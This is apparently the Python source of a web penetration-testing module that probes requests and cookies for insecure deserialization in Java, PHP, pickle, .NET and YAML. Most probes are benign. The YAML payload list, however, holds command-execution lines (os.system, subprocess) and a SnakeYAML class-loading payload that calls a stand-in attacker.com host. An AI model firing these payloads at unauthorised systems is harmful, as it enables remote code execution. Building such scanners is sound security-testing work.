"""
Jarwis AGI Pen Test - Insecure Deserialization Scanner
Detects Insecure Deserialization vulnerabilities (A08:2021 - Software and Data Integrity Failures)

Based on PortSwigger Web Security Academy: https://portswigger.net/web-security/deserialization

Attack Techniques:
- Java serialization detection (aced0005 magic bytes)
- PHP serialization detection (O:, a:, s:, i:, b:)
- Python pickle detection
- .NET serialization detection
- Node.js serialization detection
- Gadget chain exploitation (OOB detection)
- Serialized cookie manipulation

Insecure deserialization is when user-controllable data is deserialized by a website.
This can lead to remote code execution, authentication bypass, or arbitrary file access.

Usage:
    scanner = DeserializationScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager,
        oob_server=oob_callback_server  # For blind RCE detection
    )
    findings = await scanner.run(post_login=True)
"""

import asyncio
import logging
import re
import base64
import uuid
from typing import Dict, List, Optional, Any, Tuple

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from attacks.payloads.manager import PayloadManager, PayloadCategory
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class DeserializationScannerV2(BaseAttackScanner):
    """
    Insecure Deserialization Scanner (MITM-based)
    
    OWASP A08:2021 - Software and Data Integrity Failures
    CWE-502: Deserialization of Untrusted Data
    
    Attack vectors:
    - Java serialized objects (aced0005)
    - PHP serialized objects (O:, a:)
    - Python pickle objects
    - .NET serialized objects
    - YAML deserialization
    - JSON deserialization gadgets
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "deserialization"
    attack_type = "deserialization"
    owasp_category = "A08:2021"
    cwe_id = "CWE-502"
    
    # =====================================================================
    # Serialization Format Detection
    # =====================================================================
    
    # Magic bytes/patterns for detection
    SERIALIZATION_PATTERNS = {
        'java': [
            # Base64-encoded Java serialized object (aced0005)
            r'rO0AB[A-Za-z0-9+/=]+',
            # Hex-encoded Java serialized object
            r'aced0005[0-9a-fA-F]+',
            # URL-encoded versions
            r'%ac%ed%00%05',
            r'%C2%AC%C3%AD%00%05',
        ],
        'php': [
            # PHP serialized object
            r'O:\d+:"[^"]+":',  # Object
            r'a:\d+:\{',        # Array
            r's:\d+:"[^"]*";',  # String
            r'i:\d+;',          # Integer
            r'b:[01];',         # Boolean
            r'N;',              # Null
            # Base64 encoded PHP
            r'Tzo[A-Za-z0-9+/=]+',  # Base64 of O:
        ],
        'python': [
            # Python pickle magic bytes (base64)
            r'gASV[A-Za-z0-9+/=]+',  # Protocol 4
            r'KGRw[A-Za-z0-9+/=]+',  # Protocol 0
            r'KGxw[A-Za-z0-9+/=]+',  # Protocol 0 list
            # Hex pickle
            r'80[0-4][0-9a-fA-F]+',
        ],
        'dotnet': [
            # .NET BinaryFormatter
            r'AAEAAAD/////[A-Za-z0-9+/=]+',
            # .NET SOAP formatter
            r'<SOAP-ENV:',
            # ViewState
            r'/wEP[A-Za-z0-9+/=]+',
            r'/wEY[A-Za-z0-9+/=]+',
        ],
        'node': [
            # Node.js serialize (node-serialize)
            r'_\$\$ND_FUNC\$\$_',
            # cryo
            r'"__cryo_type__"',
            r'"__cryo_ref__"',
        ],
        'yaml': [
            # YAML with Python/Ruby tags
            r'!!python/',
            r'!!ruby/',
            r'!ruby/',
            r'!python/',
        ],
    }
    
    # =====================================================================
    # PHP Deserialization Payloads
    # =====================================================================
    
    # PHP object injection payloads (safe detection)
    PHP_DETECTION_PAYLOADS = [
        # Type juggling attacks
        'a:2:{i:0;s:4:"test";i:1;s:4:"test";}',
        'O:8:"stdClass":0:{}',
        'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
        
        # Boolean bypass
        'b:1;',
        'i:1;',
        
        # Array injection
        'a:1:{s:4:"user";s:5:"admin";}',
        
        # Null byte injection
        'O:4:"User":1:{s:8:"username";s:5:"admin";}',
    ]
    
    # PHP RCE payloads (for OOB detection)
    PHP_RCE_PAYLOADS = [
        # Common gadget chains (simplified - actual payloads would use ysoserial-net or PHPGGC)
        'O:21:"JDatabaseDriverMysqli":0:{}',  # Joomla
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}',  # Laravel
        'O:29:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":0:{}',  # Symfony
    ]
    
    # =====================================================================
    # Java Deserialization Payloads
    # =====================================================================
    
    # Java detection payloads (base64 encoded minimal objects)
    # These are safe detection payloads - actual exploitation would use ysoserial
    JAVA_DETECTION_PAYLOADS = [
        # Minimal serialized String object
        'rO0ABXQABHRlc3Q=',  # "test" string
        
        # HashMap with detection properties
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4',
    ]
    
    # Java gadget chain indicators (for response analysis)
    JAVA_ERROR_PATTERNS = [
        r'ClassNotFoundException',
        r'InvalidClassException',
        r'StreamCorruptedException',
        r'java\.io\.ObjectInputStream',
        r'java\.io\.ObjectOutputStream',
        r'cannot deserialize',
        r'ClassCastException',
        r'InvocationTargetException',
        r'org\.apache\.commons\.collections',
        r'org\.springframework',
        r'com\.sun\.rowset',
    ]
    
    # =====================================================================
    # Python Pickle Payloads
    # =====================================================================
    
    # Safe pickle detection payloads
    PYTHON_DETECTION_PAYLOADS = [
        # Protocol 0 - simple string
        'KFMndGVzdCcKcDAKLg==',
        # Protocol 2 - simple string
        'gAJYBAAAAHRlc3RxAC4=',
    ]
    
    # Python pickle error patterns
    PYTHON_ERROR_PATTERNS = [
        r'pickle\.UnpicklingError',
        r'_pickle\.UnpicklingError',
        r'could not find MARK',
        r'unpickling stack underflow',
        r'pickle data was truncated',
    ]
    
    # =====================================================================
    # .NET Deserialization Payloads
    # =====================================================================
    
    # .NET detection payloads
    DOTNET_DETECTION_PAYLOADS = [
        # BinaryFormatter minimal
        'AAEAAAD/////AQAAAAAAAAAEAQAAAA5TeXN0ZW0uU3RyaW5nAQAAAAVtX3ZhbHVlBQAAAAR0ZXN0Cw==',
    ]
    
    # .NET error patterns
    DOTNET_ERROR_PATTERNS = [
        r'SerializationException',
        r'BinaryFormatter',
        r'SoapFormatter',
        r'ObjectStateFormatter',
        r'LosFormatter',
        r'System\.Runtime\.Serialization',
        r'TypeLoadException',
        r'cannot deserialize',
    ]
    
    # =====================================================================
    # YAML Deserialization Payloads
    # =====================================================================
    
    YAML_DETECTION_PAYLOADS = [
        # Python YAML RCE detection
        "!!python/object/apply:os.system ['id']",
        "!!python/object/new:subprocess.check_output [['id']]",
        
        # Ruby YAML (Rails)
        "--- !ruby/object:Gem::Installer\ni: x",
        "--- !ruby/object:Gem::SpecFetcher\ni: y",
        
        # SnakeYAML (Java)
        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com\"]]]]",
    ]
    
    YAML_ERROR_PATTERNS = [
        r'yaml\.constructor\.ConstructorError',
        r'yaml\.scanner\.ScannerError',
        r'could not determine a constructor',
        r'unacceptable character',
        r'SnakeYAML',
    ]
    
    # Parameters likely to contain serialized data
    PRIORITY_PARAMS = [
        'data', 'object', 'serialized', 'token', 'session', 'state',
        'viewstate', '__viewstate', 'payload', 'obj', 'item', 'message',
        'profile', 'user', 'cookie', 'remember', 'auth', 'json', 'xml',
        'yaml', 'config', 'settings', 'preferences', 'cart', 'order'
    ]
    
    # Cookie names that often contain serialized data
    PRIORITY_COOKIES = [
        'JSESSIONID', 'PHPSESSID', 'session', 'remember', 'user', 'auth',
        'token', 'data', 'state', 'cart', 'prefs', 'preferences', 'profile'
    ]
    
    def __init__(
        self,
        http_client: JarwisHTTPClient,
        request_store: RequestStoreDB,
        checkpoint: Optional[RequestLevelCheckpoint] = None,
        token_manager: Optional[TokenManager] = None,
        config: Optional[Dict[str, Any]] = None,
        oob_server: Optional[Any] = None
    ):
        super().__init__(http_client, request_store, checkpoint, token_manager, config)
        self.oob_server = oob_server
        
        # Initialize PayloadManager for external payload loading
        self._payload_manager = PayloadManager()
        self._external_payloads_loaded = False
        self._ext_detection_payloads: List[str] = []
        self._ext_php_gadgets: List[str] = []
        self._ext_java_markers: List[str] = []
    
    def _load_external_payloads(self) -> None:
        """Lazy-load payloads from external files."""
        if self._external_payloads_loaded:
            return
        
        try:
            self._ext_detection_payloads = self._payload_manager.get_payloads(
                PayloadCategory.DESERIALIZATION, subcategory="detection", limit=50
            )
            self._ext_php_gadgets = self._payload_manager.get_payloads(
                PayloadCategory.DESERIALIZATION, subcategory="php_gadgets", limit=30
            )
            self._ext_java_markers = self._payload_manager.get_payloads(
                PayloadCategory.DESERIALIZATION, subcategory="java_markers", limit=30
            )
            self._external_payloads_loaded = True
            logger.debug(f"Loaded deserialization payloads from external files")
        except Exception as e:
            logger.warning(f"Failed to load external deserialization payloads, using embedded: {e}")
    
    def get_payloads(self) -> List[str]:
        """Return PHP detection payloads for quick testing. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Prefer external payloads, fall back to embedded
        if self._ext_detection_payloads:
            return self._ext_detection_payloads[:self.max_payloads_per_param]
        return self.PHP_DETECTION_PAYLOADS[:self.max_payloads_per_param]
    
    def get_php_gadget_payloads(self, callback_url: Optional[str] = None) -> List[str]:
        """Return PHP gadget chain payloads for exploitation testing."""
        self._load_external_payloads()
        
        payloads = self._ext_php_gadgets if self._ext_php_gadgets else self.PHP_RCE_PAYLOADS
        
        # Substitute callback URL if provided
        if callback_url:
            payloads = [p.replace('{CALLBACK_URL}', callback_url) for p in payloads]
        
        return payloads[:20]
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request might contain serialized data."""
        # Always check if we have parameters or cookies
        if not request.parameters and not request.cookies:
            return False
        
        # Check for serialization patterns in existing values
        all_values = list(request.parameters.values()) + list(request.cookies.values())
        all_values_str = ' '.join(str(v) for v in all_values)
        
        for format_name, patterns in self.SERIALIZATION_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, all_values_str, re.IGNORECASE):
                    return True
        
        # Check for priority parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        cookie_names = [c.lower() for c in request.cookies.keys()]
        
        has_priority = (
            any(p in ' '.join(param_names) for p in self.PRIORITY_PARAMS) or
            any(c in ' '.join(cookie_names) for c in self.PRIORITY_COOKIES)
        )
        
        return has_priority
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for insecure deserialization vulnerabilities.
        
        Attack methodology:
        1. Detect serialization format in parameters/cookies
        2. Test PHP deserialization
        3. Test Java deserialization
        4. Test Python pickle
        5. Test .NET deserialization
        6. Test YAML deserialization
        7. Use OOB callbacks for blind detection
        """
        findings = []
        
        # Get baseline
        baseline = await self.send_baseline_request(request)
        if not baseline:
            return findings
        
        # Analyze each parameter and cookie for serialized data
        targets = []
        
        # Check parameters
        for param_name, param_value in request.parameters.items():
            detected_format = self._detect_serialization_format(str(param_value))
            if detected_format:
                targets.append({
                    'name': param_name,
                    'value': param_value,
                    'location': 'query' if '?' in request.url and param_name in request.url else 'body',
                    'format': detected_format,
                    'type': 'parameter'
                })
        
        # Check cookies
        for cookie_name, cookie_value in request.cookies.items():
            detected_format = self._detect_serialization_format(str(cookie_value))
            if detected_format:
                targets.append({
                    'name': cookie_name,
                    'value': cookie_value,
                    'location': 'cookie',
                    'format': detected_format,
                    'type': 'cookie'
                })
        
        # If no obvious serialized data, test priority parameters
        if not targets:
            for param_name in request.parameters.keys():
                if param_name.lower() in self.PRIORITY_PARAMS:
                    targets.append({
                        'name': param_name,
                        'value': request.parameters[param_name],
                        'location': 'query' if request.method == 'GET' else 'body',
                        'format': 'unknown',
                        'type': 'parameter'
                    })
        
        # Test each target
        for target in targets[:5]:  # Limit to prevent DoS
            if self._cancelled:
                break
            
            finding = await self._test_deserialization(request, target, baseline)
            if finding:
                findings.append(finding)
        
        return findings
    
    def _detect_serialization_format(self, value: str) -> Optional[str]:
        """Detect the serialization format of a value."""
        for format_name, patterns in self.SERIALIZATION_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, value, re.IGNORECASE):
                    return format_name
        return None
    
    async def _test_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test a specific parameter/cookie for deserialization vulnerabilities."""
        
        detected_format = target['format']
        param_name = target['name']
        location = target['location']
        
        # Test based on detected format
        if detected_format == 'java':
            return await self._test_java_deserialization(request, target, baseline)
        elif detected_format == 'php':
            return await self._test_php_deserialization(request, target, baseline)
        elif detected_format == 'python':
            return await self._test_python_deserialization(request, target, baseline)
        elif detected_format == 'dotnet':
            return await self._test_dotnet_deserialization(request, target, baseline)
        elif detected_format == 'yaml':
            return await self._test_yaml_deserialization(request, target, baseline)
        else:
            # Unknown format - try all
            for test_func in [
                self._test_php_deserialization,
                self._test_java_deserialization,
                self._test_python_deserialization,
            ]:
                finding = await test_func(request, target, baseline)
                if finding:
                    return finding
        
        return None
    
    async def _test_php_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for PHP object injection."""
        
        param_name = target['name']
        location = target['location']
        
        for payload in self.PHP_DETECTION_PAYLOADS[:5]:
            # Try raw payload
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for PHP errors indicating deserialization
            is_vuln, evidence, confidence = self._check_php_errors(response, baseline)
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"PHP Object Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' accepts PHP serialized objects. "
                        f"An attacker can craft malicious serialized objects to exploit "
                        f"PHP magic methods (__wakeup, __destruct) leading to RCE, SQL injection, "
                        f"or arbitrary file operations."
                    ),
                    parameter=param_name
                )
            
            # Also try base64 encoded
            b64_payload = base64.b64encode(payload.encode()).decode()
            response_b64 = await self.send_payload(
                request=request,
                payload=b64_payload,
                location=location,
                parameter_name=param_name
            )
            
            if response_b64:
                is_vuln, evidence, confidence = self._check_php_errors(response_b64, baseline)
                if is_vuln:
                    return self.create_finding(
                        request=request,
                        response=response_b64,
                        payload=f"base64({payload})",
                        evidence=evidence,
                        confidence=confidence,
                        severity="critical",
                        title=f"PHP Object Injection (Base64) in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' accepts base64-encoded PHP serialized objects."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    async def _test_java_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for Java deserialization."""
        
        param_name = target['name']
        location = target['location']
        
        for payload in self.JAVA_DETECTION_PAYLOADS:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for Java errors
            is_vuln, evidence, confidence = self._check_java_errors(response, baseline)
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"Java Deserialization in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' accepts Java serialized objects. "
                        f"An attacker can use gadget chains (ysoserial) to achieve remote code "
                        f"execution. Common vulnerable libraries include Apache Commons Collections, "
                        f"Spring Framework, and JBoss."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_python_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for Python pickle deserialization."""
        
        param_name = target['name']
        location = target['location']
        
        for payload in self.PYTHON_DETECTION_PAYLOADS:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for Python pickle errors
            is_vuln, evidence, confidence = self._check_python_errors(response, baseline)
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"Python Pickle Deserialization in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' accepts Python pickle objects. "
                        f"Pickle deserialization is inherently unsafe and allows arbitrary code "
                        f"execution by crafting malicious __reduce__ methods."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_dotnet_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for .NET deserialization."""
        
        param_name = target['name']
        location = target['location']
        
        for payload in self.DOTNET_DETECTION_PAYLOADS:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            is_vuln, evidence, confidence = self._check_dotnet_errors(response, baseline)
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f".NET Deserialization in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' accepts .NET serialized objects. "
                        f"BinaryFormatter and similar .NET serializers can be exploited using "
                        f"ysoserial.net gadget chains for RCE."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_yaml_deserialization(
        self,
        request: StoredRequest,
        target: Dict[str, Any],
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for YAML deserialization."""
        
        param_name = target['name']
        location = target['location']
        
        for payload in self.YAML_DETECTION_PAYLOADS[:3]:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            is_vuln, evidence, confidence = self._check_yaml_errors(response, baseline)
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"YAML Deserialization in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is parsed as YAML and may allow "
                        f"dangerous deserialization. Python PyYAML, Ruby's YAML, and Java's "
                        f"SnakeYAML all have known RCE gadgets."
                    ),
                    parameter=param_name
                )
        
        return None
    
    def _check_php_errors(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> Tuple[bool, str, str]:
        """Check response for PHP deserialization indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        # PHP unserialize errors
        php_patterns = [
            (r'unserialize\(\)', 'unserialize() error'),
            (r'__wakeup\(\)', '__wakeup magic method'),
            (r'__destruct\(\)', '__destruct magic method'),
            (r'Object of class.*could not be converted', 'Object conversion error'),
            (r'Error at offset \d+ of \d+ bytes', 'Serialization offset error'),
            (r'Cannot access property', 'Property access error'),
            (r'Call to.*on a non-object', 'Method call on non-object'),
        ]
        
        for pattern, desc in php_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                # Verify it's not in baseline
                if not baseline.body or not re.search(pattern, baseline.body, re.IGNORECASE):
                    return True, f"PHP error: {desc}", "high"
        
        return False, "", ""
    
    def _check_java_errors(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> Tuple[bool, str, str]:
        """Check response for Java deserialization indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        for pattern in self.JAVA_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not baseline.body or not re.search(pattern, baseline.body, re.IGNORECASE):
                    match = re.search(pattern, body, re.IGNORECASE)
                    return True, f"Java error: {match.group(0)}", "high"
        
        return False, "", ""
    
    def _check_python_errors(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> Tuple[bool, str, str]:
        """Check response for Python pickle indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        for pattern in self.PYTHON_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not baseline.body or not re.search(pattern, baseline.body, re.IGNORECASE):
                    match = re.search(pattern, body, re.IGNORECASE)
                    return True, f"Python pickle error: {match.group(0)}", "high"
        
        return False, "", ""
    
    def _check_dotnet_errors(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> Tuple[bool, str, str]:
        """Check response for .NET deserialization indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        for pattern in self.DOTNET_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not baseline.body or not re.search(pattern, baseline.body, re.IGNORECASE):
                    match = re.search(pattern, body, re.IGNORECASE)
                    return True, f".NET error: {match.group(0)}", "high"
        
        return False, "", ""
    
    def _check_yaml_errors(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> Tuple[bool, str, str]:
        """Check response for YAML deserialization indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        for pattern in self.YAML_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not baseline.body or not re.search(pattern, baseline.body, re.IGNORECASE):
                    match = re.search(pattern, body, re.IGNORECASE)
                    return True, f"YAML error: {match.group(0)}", "high"
        
        return False, "", ""
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """General deserialization vulnerability detection."""
        if not response.body:
            return False, "", ""
        
        # Check all error patterns
        for check_func in [
            self._check_php_errors,
            self._check_java_errors,
            self._check_python_errors,
            self._check_dotnet_errors,
            self._check_yaml_errors,
        ]:
            is_vuln, evidence, confidence = check_func(response, original_response or response)
            if is_vuln:
                return is_vuln, evidence, confidence
        
        return False, "", ""


# Alias for backward compatibility
DeserializationScanner = DeserializationScannerV2
InsecureDeserializationScanner = DeserializationScannerV2
